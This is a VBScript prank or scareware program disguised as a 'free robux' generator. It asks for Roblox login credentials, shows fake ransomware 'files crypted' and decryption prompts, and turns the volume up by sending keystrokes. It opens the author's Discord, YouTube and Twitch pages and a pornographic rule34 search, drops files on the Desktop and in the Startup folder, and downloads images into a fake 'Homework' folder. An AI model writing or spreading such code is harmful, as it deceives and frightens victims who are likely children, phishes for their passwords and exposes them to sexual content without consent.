Option Explicit
'first inputbox with TTS
Dim message, sapi, robux, robux1, robux2
  message = "welcome to free robux dot exe"
  Set sapi=CreateObject("sapi.spvoice")
  sapi.speak message
  robux=InputBox("Enter your roblox email","FreeRobux")
  robux1=InputBox("Enter your Roblox Password","FreeRobux")
  robux2=InputBox("Enter the number of robux you want","FreeRobux")
WScript.sleep(2000)


'second inputbox with TTS
Dim message1, sapi1
  message1 = "now your computer is mine"
  Set sapi1=CreateObject("sapi.spvoice")
  sapi1.Speak message1
wscript.sleep(5)

'first popup
wscript.echo "all of your file has been crypted"

'wrong decrypting key inputbox 
Dim boxmagic
boxmagic=InputBox("Decrypt Key","Randomware")

'wrong decrypting key TTS
Dim message2, sapi2
  message2 = "invalid decrypt key"
  Set sapi2=CreateObject("sapi.spvoice")
  sapi2.speak message2
wscript.sleep(10)

'wrong decrypting key popup
wscript.echo "invalid decrypt key"

'valid decrypting key inputbox
Dim ransomware
ransomware=InputBox("Decrypt Key","Randomware")
Dim message3, sapi3
  message3 = "valid decrypt key"
  Set sapi3=CreateObject("sapi.spvoice")
  sapi3.speak message3
WScript.sleep(10)
wscript.echo "valid decrypt key"
wscript.echo "decryting..."
wscript.sleep(4000)
WScript.echo "all files has been succesfully decrypted"
wscript.sleep(3000)

'discord redirection TTS
Dim discord, sapi4
  discord = "join my discord subscribe to my youtube channel and follow me on twitch"
  Set sapi4=CreateObject("sapi.spvoice")
  sapi4.speak discord

'redirect to my discord
Dim URL,WshShell,i
URL = "https://discord.gg/XqzWEgFUeT"
Set WshShell = CreateObject("WScript.shell")
For i = 0 to 50
    WshShell.SendKeys(chr(175))
Next
WshShell.run "CMD /C start chrome.exe " & URL & "",0,False

'redirect to my youtube channel
Dim URL1,WshShell1,i1
URL1 = "https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA"
Set WshShell1 = CreateObject("WScript.shell")
For i1 = 0 to 50
    WshShell1.SendKeys(chr(175))
Next
WshShell1.run "CMD /C start chrome.exe " & URL1 & "",0,False

'redirect to my twitch
Dim URL2,WshShell2,i2
URL2 = "https://www.twitch.tv/taxmachines"
Set WshShell2 = CreateObject("WScript.shell")
For i2 = 0 to 50
    WshShell2.SendKeys(chr(175))
Next
WshShell2.run "CMD /C start chrome.exe " & URL2 & "",0,False

'create a txt file with funny things in it
Set oWS = WScript.CreateObject("WScript.Shell")
userProfile = oWS.ExpandEnvironmentStrings( "%userprofile%" )
Dim objFSO, objFSOText, oWs
Dim strDirectory, strFile, userProfile
strDirectory = (userprofile & "\Desktop\")
strFile = "taxmachine_own_you.txt"

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CreateTextFile(strDirectory & strFile)


'put the text file in ur mom
Set oWS54 = WScript.CreateObject("WScript.Shell")
userProfile54 = oWS54.ExpandEnvironmentStrings( "%userprofile%" )
Dim objFSO54, objFSOText54, oWs54
Dim strDirectory54, strFile54, userProfile54
strDirectory54 = (userProfile54 & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\")
strFile54 = "taxmachine_own_you.txt"

Set objFSO54 = CreateObject("Scripting.FileSystemObject")
objFSO54.CreateTextFile(strDirectory54 & strFile54)


'create the homework folder
Set oWS45 = wscript.CreateObject("Wscript.Shell")
userProfile2 = oWS45.ExpandEnvironmentStrings("%userprofile%")
dim userProfile2, oWS45
dim filesys, newfolder, newfolderpath
newfolderpath = userProfile2 & "\Desktop\Homework"
set filesys=CreateObject("Scripting.FileSystemObject")
If Not filesys.FolderExists(newfolderpath) Then
Set newfolder = filesys.CreateFolder(newfolderpath)
End If
wscript.sleep(1000)

'save an image into the computer(veibae1)
Set objShell2 = CreateObject("WScript.Shell")
Set objEnv5 = objShell2.Environment("User")

strDirectory2 = objShell2.ExpandEnvironmentStrings("%userprofile%")

dim objShell2, objEnv5, strDirectory2
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.stream")
xHttp.Open "GET", "https://cdn.discordapp.com/attachments/806342100756725792/867030018932736000/426879220-20Twitch20Veibae20gameaddict6920vshojo20vtuber.png", False
xHttp.Send

with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory2 + "\Desktop\Homework\veibaeishot.png", 2 
end with

'save another image into the computer(veibae2)
Set objShell6 = CreateObject("WScript.Shell")
Set objEnv7 = objShell6.Environment("User")

strDirectory32 = objShell6.ExpandEnvironmentStrings("%userprofile%")

dim objShell6, objEnv7, strDirectory32
dim xHttp1: Set xHttp1 = createobject("Microsoft.XMLHTTP")
dim bStrm1: Set bStrm1 = createobject("Adodb.stream")
xHttp1.Open "GET", "https://cdn.discordapp.com/attachments/862411691316478043/876586622517407754/429476420-20Twitch20Veibae20gameaddict6920vshojo20vtuber.png", False
xHttp1.Send

with bStrm1
    .type = 1 
    .open
    .write xHttp1.responseBody
    .savetofile strDirectory32 + "\Desktop\Homework\veibaeishot1.png", 2 
end with

'save another image into the computer(veibae3)
Set objShell9 = CreateObject("WScript.Shell")
Set objEnv9 = objShell9.Environment("User")

strDirectory3 = objShell9.ExpandEnvironmentStrings("%userprofile%")

dim objShell9, objEnv9, strDirectory3
dim xHttp2: Set xHttp2 = createobject("Microsoft.XMLHTTP")
dim bStrm2: Set bStrm2 = createobject("Adodb.stream")
xHttp2.Open "GET", "https://cdn.discordapp.com/attachments/806342100756725792/867029967467315210/430472820-20Twitch20Veibae20gameaddict6920vshojo20vtuber.png", False
xHttp2.Send

with bStrm2
    .type = 1 
    .open
    .write xHttp2.responseBody
    .savetofile strDirectory3 + "\Desktop\Homework\veibaeishot2.png", 2 
end with

'save another image into the computer(veibae4)
Set objShell11 = CreateObject("WScript.Shell")
Set objEnv10 = objShell11.Environment("User")

strDirectory6 = objShell11.ExpandEnvironmentStrings("%userprofile%")

dim objShell11, objEnv10, strDirectory6
dim xHttp3: Set xHttp3 = createobject("Microsoft.XMLHTTP")
dim bStrm3: Set bStrm3 = createobject("Adodb.stream")
xHttp3.Open "GET", "https://cdn.discordapp.com/attachments/806342100756725792/865260532994932786/E4IcfjPXwAYH_1g.png", False
xHttp3.Send

with bStrm3
    .type = 1 
    .open
    .write xHttp3.responseBody
    .savetofile strDirectory6 + "\Desktop\Homework\veibaeishot3.png", 2 
end with

'save another image into the computer(veibae5)
Set objShell55 = CreateObject("WScript.Shell")
Set objEnv55 = objShell55.Environment("User")

strDirectory55 = objShell55.ExpandEnvironmentStrings("%userprofile%")

dim objShell55, objEnv55, strDirectory55
dim xHttp4: Set xHttp4 = createobject("Microsoft.XMLHTTP")
dim bStrm4: Set bStrm4 = createobject("Adodb.stream")
xHttp4.Open "GET", "https://cdn.discordapp.com/attachments/806342100756725792/865261046721806356/E6LLJbDVEAgvZl4.png", False
xHttp4.Send

with bStrm4
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile strDirectory55 + "\Desktop\Homework\veibaeishot4.png", 2 
end with

'save another image into the computer(veibae6)
Set objShell66 = CreateObject("WScript.Shell")
Set objEnv66 = objShell66.Environment("User")

strDirectory66 = objShell66.ExpandEnvironmentStrings("%userprofile%")

dim objShell66, objEnv66, strDirectory66
dim xHttp5: Set xHttp5 = createobject("Microsoft.XMLHTTP")
dim bStrm5: Set bStrm5 = createobject("Adodb.stream")
xHttp5.Open "GET", "https://cdn.discordapp.com/attachments/806342100756725792/865261439244435496/E6SO9HlUUAMtmnq.png", False
xHttp5.Send

with bStrm5
    .type = 1 
    .open
    .write xHttp5.responseBody
    .savetofile strDirectory66 + "\Desktop\Homework\veibaeishot5.png", 2 
end with
wscript.Sleep(4000)

'redirection de type plutot sexy amogus 
Dim URL77,WshShell77,i77
URL77 = "https://rule34.xxx/index.php?page=post&s=list&tags=veibae+"
Set WshShell77 = CreateObject("WScript.shell")
For i77 = 0 to 50
    WshShell77.SendKeys(chr(175))
Next
WshShell77.run "CMD /C start chrome.exe " & URL77 & "",0,False

'saying the truth
Dim rule34, xxx
  rule34 = "have fun doing sex"
  Set xxx=CreateObject("sapi.spvoice")
  xxx.Speak rule34
  wscript.echo "have fun doing sex"
